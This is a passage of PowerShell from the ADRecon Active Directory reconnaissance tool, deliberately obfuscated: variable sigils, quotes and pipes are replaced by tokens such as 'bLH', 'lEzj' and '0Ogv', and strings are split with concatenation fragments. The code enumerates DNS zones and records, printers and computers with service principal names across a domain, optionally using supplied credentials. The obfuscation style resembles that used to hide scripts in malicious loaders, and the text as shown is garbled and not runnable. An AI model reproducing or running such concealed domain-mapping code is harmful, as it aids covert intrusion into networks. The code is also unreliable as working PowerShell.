                bLHSerialRaw = bLHDNSRecord[24..27]
                # reverse for big endian
                bLHNull = [array]::Reverse(bLHSeri'+'alRaw)
                bLHSerial = [BitConverter]::ToUInt32(bLHSerialRaw, 0)

                bLHRefreshRaw = bLHDNSRecord[28..31]
                bLHNull = [array]::Reverse(bLHRefreshRaw'+')
                bLHRefresh = [BitConverter]::ToUInt32(bLHRefreshRaw, 0)

                bLHRetryRaw = bLHDNSRecord[32..35]
                bLHNull = [array]::Reverse(bLHRetryRaw)
                bLHRetry = [BitConverter]::ToUInt32(bLHRetryRaw, 0)

                bLHExpiresRaw = bLHDNSRecord[36..39]
                bLHNull = [array]::Reverse(bLHExpiresRaw)
                bLHExpires = [BitConverter]::ToUInt32(bLHExpiresRaw, 0)

                bLHMinTTLRaw = bLHDNSRecord[40..43]
                bLHNull = [array]::Reverse(bLHMinTTLRaw)
                bLHMinTTL = [BitConverter]::ToUInt32(bLHMinTTLRaw, 0)

                bLHData = lEzj[lEzj + bLHSerial + lEzj][lEzj + bLHPrimaryNS + lEzj][lEzj + bLHResponsibleParty + lEzj][lEzj + bLHRefresh + lEzj][lEzj + bLHRetry + lEzj][lEzj + bLHExpires + lEzj][lEzj + bLHMinTTL + lEzj]lEzj
                bLHDNSRecordObject 0Ogv Add-Member Noteproperty xfJ4RecordTypexfJ4 xfJ4SOAxfJ4
            }

            12
            {
                bLHPtr = Get-Name bLHDNSRecord[24..bLHDNSRecord.length]
                bLHData = bLHPtr
                bLHDNSRecordObject 0Ogv Add-Member Noteproperty xfJ4RecordTypexfJ4 xfJ4PTRxfJ4
            }

            13
            {
                [string]bLHCPUType = lEzjlEzj
                [string]bLHOSType  = lEzjlEzj
                [int]bLHSegmentLength = bLHDNSRecord[24]
                bLHIndex = 25
                while (bLHSegmentLength-- -gt 0)
                {
                    bLHCPUType += [char]bLHDNSRecord[bLHIndex++]
                }
                bLHIndex = 24 + bLHDNSRecord[24] + 1
                [int]bLHSegmentLength = bLHIndex++
                while (bLHSegmentLength-- -gt 0)
                {
                    bLHOSType += [char]bLHDNSRecord[bLHIndex++]
                }
                bLHData = lEzj[lEzj + bLHCPUType + lEzj][lEzj + bLHOSType + lEzj]lEzj
                bLHDNSRecordObject 0Ogv Add-Member Noteproperty xfJ4RecordTypexfJ4 xfJ4HINFOxfJ4
            }

            15
            {
                bLHPriorityRaw = bLHDNSRecord[24..25]
                # reverse for big endian
                bLHNull = [array]::Reverse(bLHPriorityRaw)
                bLHPriority = [BitConverter]::ToUInt16(bLHPriorityRaw, 0)
                bLHMXHost   = Get-Name bLHDNSRecord[26..bLHDNSRec'+'ord.length]
                bLHData = lEzj[lEzj + bLHPriority + lEzj][lEzj + bLHMXHost + lEzj]lEzj
                bLHDNSRecordObject 0Ogv Add-Member Noteproperty xfJ4RecordTypexfJ4 xfJ4MXxfJ4
            }

            16
            {
               '+' [string]bLHTXT  = xfJ4xfJ4
                [int]bLHSegmentLength = bLHDNSRecord[24]
                bLHIndex = 25
                while (bLHSegmentLength-- -gt 0)
                {
                    bLHTXT += [char]bLHDNSRecord[bLHIndex++]
                }
                bLHData = bLHTXT
                bLHDNSRecordObject 0Ogv Add-Member Noteproperty xfJ4RecordTypexfJ4 xfJ4TXTxfJ4
            }

            28
            {
        		#'+'## yeah, this doesnxfJ4t do all the fancy formatting that can be done for IPv6
                bLHAAAA = lEzjlEzj
                for (bLHi = 24; bLHi'+' -lt 40; bLHi+=2)
                {
                    bLHBlockRaw = bLHDNSRecord[bLHi..bLH(bLHi+1)]
                    # reverse for big endian
                    bLHNull = [array]::Reverse(bLHBlockRaw)
                    bLHBlock = [BitConverter]::ToUInt16(bLHBlockRaw, 0)
			        bLHAAAA += (bLHBlock).ToString(xfJ4x4xfJ4)
			        If (bLHi -ne 38)
                    {
                        bLHAAAA += xfJ4:xfJ4
                    }
                }
                bLHData = bLHAAAA
                bLHDNSRecordObject 0Ogv A'+'dd-Member Noteproperty xfJ4RecordTypexfJ4 xfJ4AAAAxfJ4
            }

            33
            {
                bLHPriorityRaw = bLHDNSRecord[24..25]
                # reverse for big endian
                bLHNull = [array]::Reverse(bLHPriorityRaw)
                bLHPriority = [BitConverter]::ToUInt16(bLHPriorityRaw, 0)

                bLHWeightRaw = bLHDNSRecord[26..27]
                bLHNull = [array]::Reverse(bLHWeightRaw)
                bLHWeight = [BitConverter]::ToUInt16(bLHWeightRaw, 0)

                bLHPortRaw = bLHDNSRecord[28..29]
                bLHNull = [array]::Reverse(bLHPortRaw)
                bLHPort = [BitConverter]::ToUInt16(bLHPortRaw, 0)

                bLHSRVHost = Get-Name bLHDNSRecord[30..bLHDNSRecord.length]
                bLHData = lEzj[lEzj + bLHPriority + lEzj][lEzj + bLHWeight + lEzj][lEzj + bLHPort + lEzj][lEzj + bLHSRVHost + lEzj]lEzj
                bLHDNSRecordObject 0Ogv Add-Member Noteproperty xfJ4RecordTypexfJ4 xfJ4SRVxfJ4
            }

            default
            {
                bLHData = bLH([System.Convert]::ToBase64String(bLHDNSRecord[24..bLHDNSRecord.length]))
                bLHDNSRecordObject 0Ogv Add-Member Noteproperty xfJ4RecordTypexfJ4 xfJ4UNKNOWNxfJ4
            }
        }
        bLHDNSRecordObject 0Ogv Add-Member Noteproperty xfJ4UpdatedAtSerialxfJ4 bLHUpdatedAtSerial
        bLHDNSRecordObject 0Ogv Add-Member Noteproperty xfJ4TTLxfJ4 bLHTTL
        bLHDNSRecordObject 0Ogv Add-Member Noteproperty xfJ4AgexfJ4 bLHAge
        bLHDNSRecordObject 0Ogv Add-Member Noteproperty xfJ4TimeStampxfJ4 bLHTimeStamp
        bLHDNSRecordObject 0Ogv Add-Member Noteproperty xfJ4DataxfJ4 bLHData
        Return bLHDNSRecordObject
    }
}

Function Get-ADRDNSZone
{
<#
.SYNOPSIS
    Returns all DNS Zones and Records in the current (or specified) domain.

.DESCRIPTION
    Returns all DNS Zones and Records in the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER DomainController
    [string]
    IP Address of the Domain Controller.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER ADROutputDir
    [string]
    Path for ADRecon output folder.

.PARAMETER'+' OutputType
    [array]
    Output Type.

.PARAMETER ADRDNSZones
    [bool]

.PARAMETER ADRDNSRecords
    [bool]

.OUTPUTS
    CSV files are created in the folder specified with the information.
#>
    param(
        [Parameter(Mandatory = bLHtrue)]
        [string] bLHMethod,

        [Parameter(Mandatory = bLHfalse)]
        [DirectoryServices.DirectoryEntry] bLHobjDomain,

        [Parameter(Mandatory = bLHfalse)]
        [string] bLHDomainController,

        [Parameter(Mandatory = bLHfalse)]
        [Management.Automation.PSCredential] bLHCredential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = bLHtrue)]
        [int] bLHPageSize,

        [Parameter(Mandatory = bLHtrue)]
        [string] bLH'+'ADROutputDir,

        [Parameter(Mandatory = bLHtrue)]
        [array] bLHOutputType,

        [Parameter(Mandatory = bLHfalse)]
        [bool] bLHADRDNSZones = bLHtrue,

        [Parameter(Mandatory = bLHfalse)]
        [bool] bLHADRDNSRecords = bLHfalse
    )

    If (bLHMethod -eq xfJ4ADWSxfJ4'+')
    {
        Try
        {
            bLHADDNSZones = Get-ADObject -LDAPFilter xfJ4(objectClass=dnsZone)xfJ4 -Properties Name,whenCreated,whenChanged,usncreated,usnchanged,distinguishedname
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRDNSZone] Error while enumerating dnsZone ObjectslEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
        }

        bLHDNSZoneArray = @()
        If (bLHADDNSZones)
        {
            bLHDNSZoneArray += bLHADDNSZones
            Remove-Variable ADDNSZones
        }

        Try
        {
           '+' bLHADDomain = Get-ADDomain
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRDNSZone] Error getting Domain ContextlEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.E'+'xception.Message)lEzj
            Return bLHnull
        }

        Try
        {
            bLHADDNSZones1 = Get-ADObject -LDAPFilter xfJ4(objectClass=dnsZone)xfJ4 -SearchBase lEzjDC=DomainDnsZones,bLH(bLHADDomain.DistinguishedName)lEzj -Properties Name,whenCreated,whenChanged,usncreated,usnchanged,distinguishedname
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRDNSZone] Error while enumerating DC=DomainDnsZones,bLH(bLHADDomain.DistinguishedName) dnsZone ObjectslEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
        }
        If (bLHADDNSZones1)
        {
            bLHDNSZoneArray += bLHADDNSZones1
            Remove-Variable ADDNSZones1
        }

        Try
        {
            bLHADDNSZones2 = Get-ADObject -LDAPFilter xfJ4(objectClass=dnsZone)xfJ4 -SearchBase lEzjDC=ForestDnsZones,DC=bLH(bLHADDomain.Forest -replace xfJ4cnI.xfJ4,xfJ4,DC=xfJ4)lEzj -Properties Name,whenCreated,whenChanged,usncreated,usnchanged,distinguishedname
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRDNSZone] Error while enumerating DC=ForestDnsZones,DC=bLH(bLHADDomain.Forest -replace xfJ4cnI.xfJ4,xfJ4,DC=xfJ4) dnsZone ObjectslEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
        }
        If (bLHADDNSZones2)
        {
            bLHDNSZoneArray += bLHADDNSZones2
            Remove-Variable ADDNSZones2
        }

        If (bLHADDomain)
        {
            Remove-Variable ADDomain
        }

        Write-Verbose lEzj[*] Total DNS Zones: bLH([A'+'DRecon.ADWSClass]::ObjectCount(bLHDNSZoneArray))lEzj

        If (bLHDNSZoneArray)
        {
            bLHADDNSZonesObj = @()
            bLHADDNSNodesObj = @()
            bLHDNSZoneArray 0Ogv ForEach-Object {
                # Create the object for each instance.
                bLHObj = New-Object PSObject
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name Name -Value bLH([ADRecon.ADWSClass]::CleanString(bLH_.Name))
                Try
                {
                    bLHDNSNodes = Get-ADObject -SearchBase bLH(bLH_.DistinguishedName) -LDAPFilter xfJ4(objectClass=dnsNode)xfJ4 -Properties DistinguishedName,dnsrecord,dNSTombstoned,Name,ProtectedFromAccidentalDeletion,showInAdvancedViewOnly,whenChanged,whenCreated
                }
                Catch
                {
                    Write-Warning lEzj[Get-ADRDNSZone] Error while enumerating bLH(bLH_.DistinguishedName) dnsNode ObjectslEzj
                    Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
                }
                If (bLHDNSNodes)
                {
                    bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name RecordCount -Value bLH(bLHDNSNodes 0Ogv Measure-Object 0Ogv Select-Object -Exp'+'andProperty Count)
                    bLHDNSNodes 0Ogv ForEach-Object {
                        bLHObjNode = New-Object PSObject
                        bLHObjNode 0Ogv Add-Member -MemberType NoteProperty -Name ZoneName -Value bLHObj.Name
                        bLHObjNode 0Ogv Add-Member -MemberType NoteProperty -Name Name -Value bLH_.Name
                        Try
                        {
                            bLHDNSRecord = Convert-DNSRecord bLH_.dnsrecord[0]
                        }
                        Catch
                        {
                            Write-Warning lEzj[Get-ADRDNSZone] Error while converting the DNSRecordlEzj
                            Write-Verbose lEzj[EXCEPT'+'ION] bLH(bLH_.Exception.Message)lEzj
                        }
                        bLHObjNode 0Ogv Add-Member -MemberType NoteProperty -Name RecordType -Value bLHDNSRecord.RecordType
                        bLHObjNode 0Ogv Add-Member -MemberType NoteProperty -Name Data -Value bLHDNSRecord.Data
                        bLHObjNode 0Ogv Add-Member -MemberType NoteProperty -Name TTL -Value bLHDNSRecord.TTL
                        bLHObjNode 0Ogv Add-Member -MemberType NoteProperty -Name Age -Value bLHDNSRecord.Age
                        bLHObjNode 0Ogv Add-Member -MemberType NoteProperty -Name TimeStamp -Value bLHDNSRecord.TimeStamp
                        bLHObjNode 0Ogv Add-Member -MemberType NoteProperty -Name UpdatedAtSerial -Value bLHDNSRecord.UpdatedAtSerial
                        bLHObjNode 0Ogv Add-Member -MemberType NoteProperty -Name whenCreated -Value bLH_.whenCreated
                        bLHObjNode 0Ogv Add-Member -MemberType NoteProperty -Name whenChanged -Value bLH_.whenChanged
                        # TO DO LDAP part
                        #bLHObjNode 0Ogv Add-Member -MemberType NoteProperty -Name dNSTombstoned -Value bLH_.dNSTombstoned
                        #bLHObjNode 0Ogv Add-Member -MemberType NoteProperty -Name ProtectedFromAccidentalDeletion -Value bLH_.ProtectedFromAccidentalDeletion
                        bLHObjNode 0Ogv Add-Member -MemberType NoteProperty -Name showInAdvancedViewOnly -Value bLH_.showInAdvancedViewOnly
                        bLHObjNode 0Ogv Add-Member -MemberType NoteProperty -Name DistinguishedName -Value bLH_.DistinguishedName
                        bLHADDNSNodesObj += bLHObjNode
                        If (bLHDNSRecord)
                        {
                            Remove-Variable DNSRecord
                        }
                    }
                }
                Else
                {
                    bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name RecordCount -Value bLHnull
                }
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name USNCreated -Value bLH_.usncreated
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name USNChanged -Value bLH_.usnchanged
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name whenCreated -Value bLH_.whenCreated
                bLHObj 0'+'Ogv Add-Member -MemberType NoteProperty -Name whenCh'+'anged -Value bLH_.whenChanged
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name DistinguishedName -Value bLH_.DistinguishedName
                bLHADDNSZonesObj += bLHObj
            }
            Write-Verbose lEzj[*] Total DNS Records: bLH([ADRecon.ADWSClass]::ObjectCount(bLHADDNSNodesObj))lEzj
            Remove-Variable DNSZoneArray
        }
    }

    If (bLHMethod -eq xfJ4LDAPxfJ4)
    {
        bLHobjSearcher = New-Object System.DirectoryServices.Director'+'ySearcher bLHobjDomain
        bLHObjSearcher.PageSize = bLHPageSize
        bLHObjSearcher.PropertiesToLoad.AddRange((lEzjnamelEzj,lEzjwhencreatedlEzj,lEzjwhenchangedlEzj,lEzjusncreatedlEzj,lEzjusnchangedlEzj,lEzjdistingui'+'shednamelEzj))
        bLHObjSearcher.Filter = lEzj(objectClass=dnsZone)lEzj
        bLHObjSearcher.SearchScope = lEzjSubtreelEzj

        Try
        {
            bLHADDNSZones = bLHOb'+'jSearcher.FindAll()
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRDNSZone] Error while enumerating dnsZone ObjectslEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
        }
        bLHObjSearcher.dispose()

        bLHDNSZoneArray = @()
        If (bLHADDNSZones)
        {
            bLHDNSZoneArray += bLHADDNSZones
            Remove-Variable ADDNSZones
        }

        b'+'LHSearchPath = lEzjDC=DomainDnsZoneslEzj
        If (bLHCredential -ne [Management.Automation.PSCredential]::Empty)
        {
            bLHobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry '+'lEzjLDAP://bLH(bLHDomainController)/bLH(bLHSearchPath),bLH(bLHobjDomain.distinguishedName)lEzj, bLHCredential.UserName,bLHCredential.GetNetworkCredential().Password
        }
        Else
        {
            bLHobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry lEzjLDAP://bLH(bLHSearchPath),bLH(bLHobjDomain.distinguishedName)lEzj
        }
        bLHobjSearcherPath = New-Object System.DirectoryServices.DirectorySearcher bLHobjSearchPath
        bLHobjSearcherPath.Filter = lEzj(objectClass=dnsZone)lEzj'+'
        bLHobjSearcherPath.PageSize = bLHPageSize
        bLHobjSearcherPath.PropertiesToLoad.AddRange((lEzjnamelEzj,lEzjwhencreatedlEzj,lEzjwhenchangedlEzj,lEzjusncreatedlEzj,lEzjusnchangedlEzj,lEzjdistinguishednamelEzj))
        bLHobjSearcherPath.SearchScope = lEzjSubtreelEzj

        Try
        {
            bLHADDNSZones1 = bLHobjSearcherPath.FindAll()
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRDNSZone] Error while enumerating bLH(bLHSearchPath),bLH(bLHobjDomain.distinguishedName) dnsZone Objects.lEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
        }
        bLHobjSearcherPath.dispose()

        If (bLHADDNSZones1)
        {
            bLHDNSZoneArray += bLHADDNSZones1
            Remove-Variable ADDNSZones1
        }

        bLHSearchPath = lEzjDC=ForestDnsZoneslEzj
        If (bLHCredential -ne [Management.Automation.PSCredential]::Empty)
        {
            bLHDomainFQDN = Get-DNtoFQDN(bLHobjDomain.distinguishedName)
            bLHDomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(lEzjDomainlEzj,bLH(bLHDomainFQDN),bLH(bLHCredential.UserName),bLH(bLHCredential.GetNetworkCredential().password))
            Try
            {
                bLHADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain(bLHDomainContext)
            }
            Catch
            {
                Write-Warning lEzj[Get-ADRForest] Error getting Domain ContextlEzj
                Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
                Return bLHnull
            }
            Remove-Variable DomainContext
            bLHobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry lEzjLDAP://bLH(bLHDomainController)/bLH(bLHSearchPath),DC=bLH(bLHADDomain.Forest.Name -replace xfJ4cnI.xfJ4,xfJ4,DC=xfJ4)lEzj, bLHCredential.UserName,bLHCredential.GetNetworkCredential().Password
        }
        Else
        {
            bLHADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            bLHobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry lEzjLDAP://bLH(bLHSearchPath),DC=bLH(bLHADDomain.Forest.Name -replace xfJ4cnI.xfJ4,xfJ4,DC=xfJ4)lEzj
        }

        bLHobjSearcherPath = New-Object System.DirectoryServices.DirectorySearcher bLHobjSearchPath
        bLHobjSearcherPath.Filter = lEzj(objectClass=dnsZone)lEzj
        bLHobjSearcherPath.PageSize = bLHPageSize
        bLHobjSearcherP'+'ath.PropertiesToLoad.AddRange((lEzjnamelEzj,lEzjwhencreatedlEzj,lEzjwhenchangedlEzj,lEzjusncreatedlEzj,lEzjusnchangedlEz'+'j,lEzjdistinguishednamelEzj))
        bLHobjSearcherPath.SearchScope = lEzjSubtreelEzj

        Try
        {
            bLHADDNSZones2 = bLHobjSearcherPath.FindAll()
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRDNSZone] Error while enumerating bLH(bLHSearchPath),DC=bLH(bLHADDomain.Forest.Name -replace'+' xfJ4cnI.xfJ4,xfJ4,DC=xfJ4) dnsZone Objects.lEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
        }
        bLHobjSearcherPath.dispose()

        If (bLHADDNSZones2)
        {
            bLHDNSZoneArray += bLHADDNSZ'+'ones2
            Remove-Variable ADDNSZones2
        }

        If(bLHADDomain)
        {
            Remove-Variable ADDomain
        }

        Write-Verbose lEzj[*] Total DNS Zones: bLH([ADRecon.LDAPClass]::ObjectCount(bLHDNSZoneArray))lEzj

        If (bLHDNSZoneArray)
        {
            bLHADDNSZonesObj = @()
            bLHADDNSNodesObj = @()
            bLHDNSZoneArray 0Ogv ForEach-Object {
                If (bLHCredential -ne [Management.Autom'+'ation.PSCredential]::Empty)
                {
                    bLHobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry lEzjLDAP://bLH(bLHDomainController)/bLH(bLH_.Properties.distinguishedname)lEzj, bLHCredential.UserName,bLHCredential.GetNetworkCredential().Password
                }
                Else
                {
                    bLHobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry lEzjLDAP://bLH(bLH_.Properties.distinguishedname)lEzj
                }
                bLHobjSearcherPath = New-Object System.DirectoryServices.DirectorySearcher bLHobjSearchPath
                bLHobjSearcherPath.Filter = lEzj(objectClass=dnsNode)lEzj
                bLHobjSearcherPath.PageSize = bLHPageSize
                bLHobjSearcherPath.PropertiesToLoad.AddRange((lEzjdistinguishednamelEzj,lEzjdnsrecordlEzj,lEzjnamelEzj,lEzjdclEzj,lEzjshowinadvancedviewonlylEzj,lEzjwhenchangedlEzj,lEzjwhencreatedlEzj))
                Try
                {
                    bLHDNSNodes = bLHobjSearcherPath.FindAll()
                }
                Catch
                {
                    Write-Warning lEzj[Get-ADRDNSZone] Error while enumerating bLH(bLH_.Properties.distinguishedname) dnsNode ObjectslEzj
                    Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
                }
                bLHobjSearcherPath.dispose()
                Remove-Variable objSearchPath

                # Create the object for each instance.
                bLHObj = New-Object PSObject
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name Name -Value bLH([ADRecon.LDAPClass]::CleanString(bLH_.Properties.name[0]))
                If (bLHDNSNodes)
                {
                    bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name RecordCount -Value bLH(bLHDNSNodes 0Ogv Measure-Object 0Ogv Select-Object -ExpandProperty Count)
                    bLHDNSNodes 0Ogv ForEach-Object {
                        bLHObjNode = New-Object PSObject
                        bLHObjNode 0Ogv Add-Member -MemberType NoteProperty -Name ZoneName -Value bLHObj.Name
                        bLHname = ([string] bLH(bLH_.Properties.name))
                        If (-Not bLHname)
                        {
                            bLHname = ([string] bLH(bLH_.Properties.dc))
                        }
                        bLHObjNode 0Ogv Add-Member -MemberType NoteProperty -Name Name -Value bLHname
                        Try
                        {
                            bLHDNSRecord = Convert-DNSRecord bLH_.Properties.dnsrecord[0]
                        }
                        Catch
                        {
                            Write-Warning lEzj[Get-ADRDNSZone] Error while converting the DNSRecordlEzj
                            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
                        }
                        bLHObjNode 0Ogv Add-Member -MemberType NoteProperty -Name RecordType -Value bLHDNSRecord.RecordType
                        bLHObjNode 0Ogv Add-Member -MemberType NoteProperty -Name Data -Value bLHDNSRecord.Data
                        bLHObjNode 0Ogv Add-Member -MemberType NoteProperty -Name TTL -Value bLHDNSRecord.TTL
                        bLHObjNode 0Ogv Add-Member -MemberType NoteProperty -Name Age -Value bLHDNSReco'+'rd.Age
                        bLHObjNode 0Ogv Add-Member -MemberType NoteProperty -Name TimeStamp -Value bLHDNSRecord.TimeStamp
                        bLHObjNode 0Ogv Add-Member -MemberType NoteProperty -Name UpdatedAtSerial -Value bLHDNSRecord.UpdatedAtSerial
                        bLHObjNode 0Ogv Add-Member -MemberType NoteProperty -Name whenCreated -Value ([DateTime] bLH(bLH_.Properties.whencreated))
                        bLHObjNode 0Ogv Add-Member -MemberType NoteProperty -Name whenChanged -Value ([DateTime] bLH(bLH_.Properties.whenchanged))
                        # TO DO
                        #bLHObjNode 0Ogv Add-Member -MemberType NoteProperty -Name dNSTombstoned -Value bLHnull
                        #bLHObjNode 0Ogv Add-Member -MemberType NoteProperty -Name ProtectedFromAccidentalDeletion -Value bLHnull
                        bLHObjNode 0Ogv Add-Member -MemberType NoteProperty -Name showInAdvancedViewOnly -Value ([string] bLH(bLH_.Properties.showinadvancedviewonly))
                        bLHObjNode 0Ogv Add-Member -MemberType NoteProperty -Name DistinguishedName -Value ([string] bLH(bLH_.Properties.distinguishedname))
                        bLHADDNSNodesObj += bLHObjNode
                        If (bLHDNSRecord)
                        {
                            Remove-Variable DNSRecord
                        }
                    }
                }
                Else
                {
 '+'                   bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name RecordCount -Value bLHnull
                }
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name USNCreated -Value ([string] bLH(bLH_.Properties.usncreated))
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name USNChan'+'ged -Value ([string] bLH(bLH_.Properties.usnchanged))
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name whenCreated -Value ([DateTime] bLH(bLH_.Properties.whencreated))
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name whenChanged -Value ([DateTime] bLH(bLH_.Properties.whenchanged))
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name DistinguishedName -Value ([string] bLH(bLH_.Properties.distinguishedname))
                bLHADDNSZonesObj += bLHObj
            }
            Write-Verbose lEzj[*] Total DNS Records: bLH([ADRecon.LDAPClass]::ObjectCount(bLHADDNSNodesObj))lEzj
            Remove-Variable DNSZoneArray
        }
    }

    If (bLHADDNSZonesObj -and bLHADRDNSZones)
    {
        Export-ADR bLHADDNSZonesObj bLHADROutputDir bLHOutputType lEzjDNSZoneslEzj
        Remove-Variable ADDNSZonesObj
    }

    If (bLHADDNSNodesObj -and bLHADRDNSRecords)
    {
        Export-ADR bLHADDNSNodesObj bLHADROutputDir bLHOutputType lEzjDNSNodeslEzj
        Remove-Variable ADDNSNodesObj
    }
}

Function Get-ADRPrinter
{
<#
.SYNOPSIS
    Returns all printers in the current (or specified) domain.

.DESCRIPTION
    Returns all printers in the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.OUTPUTS
    PSObject.
#>

    param(
        [Parameter(Mandatory = bLHtrue)]
        [string] bLHMethod,

        [Parameter(Mandatory = bLHfalse)]
        [DirectoryServices.DirectoryEntry] bLHobjDomain,

        [Parameter(Mandatory = bLHtrue)]
        [int] bLHPageSize,

        [Parameter(Mandatory = bLHfalse)]
        [int] bLHThreads = 10
    )

    If (bLHMethod -eq xfJ4ADWSxfJ4)
    {
        Try
        {
            bLHADPrinters = @( Get-ADObject -LDAPFilter xfJ4(objectCategory=printQueue)xfJ4 -Properties driverName,driverVersion,Name,portName,printShareName,serverName,url,whenChanged,whenCreated )
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRPrinter] Error while enumerating printQueue ObjectslEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
           '+' Return bLHnull
        }

        If (bLHADPrinters)
        {
            Write-Verbose lEzj[*] Total Printers: bLH([ADRecon.ADWSClass]::ObjectCount(bLHADPrinters))lEzj
            bLHPrintersObj = [ADRecon.ADWSClass]::PrinterParser(bLHADPrinters, bLHThreads)
            Remove-Variable ADPrinters
        }
    }

    If (bLHMethod -eq xfJ4LDAPxfJ4)
    {
        bLHobjSearcher = New-Object System.DirectoryServices.DirectorySearcher bLHobjDomain
        bLHObjSearcher.PageSize = bLHPageSize
        bLHObjSearcher.Filter = lEzj(objectCategory=printQueue)lEzj
        bLHObjSearcher.SearchScope = lEzjSubtreelEzj

        Try
        {
            bLHADPrinters = bL'+'HObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRPrinter] Error while enumerating printQueue ObjectslEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            Return bLHnull
        }
        bLHObjSearcher.dispose()

        If (bLHADPrinters)
        {
            bLHcnt = bLH([ADRecon.LDAPClass]::ObjectCount(bLHADPrinters))
            If (bLHcnt -ge 1)
            {
                Write-Verbose lEzj[*] Total Printers: bLHcntlEzj
                bLHPrintersObj = [ADRecon.LDAPClass]::PrinterParser(bLHADPrinters, bLHThreads)
            }
            Remove-Variable ADPrinters
        }
    }

    If (bLHPrintersObj)
    {
        Return bLHPrintersObj
    }
    Else
    {
        Return bLHnull
    }
}

Function Get-ADRComputer
{
<'+'#
.SYNOPSIS
    Returns all computers and/or service principal name (SPN) in the current (or specified) domain.

.DESCRIPTION
    Returns all computers and/or service principal name (SPN) in the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER date
    [DateTime]
    Date when ADRecon was executed.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Dire'+'ctory Entry object.

.PARAMETER DormantTimeSpan
    [int]
    Timespan for Dormant accounts. Default 90 days.

.PARAMTER PassMaxAge
    [int]
    Maximum machine account password age. Default 30 days
    https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/domain-member-maximum-machine-account-password-age

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.PARAMETER ADRComputers
    [bool]

.PARAMETER ADRComputerSPNs
    [bool]

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = bLHtrue)]
        [string] bLHMethod,

        [Parameter(Mandatory = bLHtrue)]
        [DateTime] bLHdate,

        [Parameter(Mandatory = bLHfalse)]
    '+'    [DirectoryServices.DirectoryEntry] bLHobjDomain,

        [Parameter(Mandatory = bLHtrue)]
        [int] bLHDormantTimeSpan = 90,

        [Parameter(Mandatory = bLHtrue)]
        [int] bLHPassMaxAge = 30,

        [Parameter(Mandatory = bLHtrue)]
        [int] bLHPageSize,

        [Parameter(Mandatory = bLHfalse)]
        [int] bLHThreads = 10,

        [Parameter(Mandatory = bLHfalse)]
        [int] bLHADRComputers = bLHtrue,

        [Parameter(Mandatory = bLHfalse)]
        [int] bLHADRComputerSPNs = bLHfalse
    )

    If (bLHMethod -eq xfJ4ADWSxfJ4)
    {
        If (!bLHADRComputers)
        {
            Try
            {
                bLHADComputers = @( Get-ADObject -LDAPFilter lEzj(&(samAccountType=805306369)(servicePrincipalName=*))lEzj -ResultPageSize bLHPageSize -Properties Name,servicePrincipalName )
            }
            Catch
            {
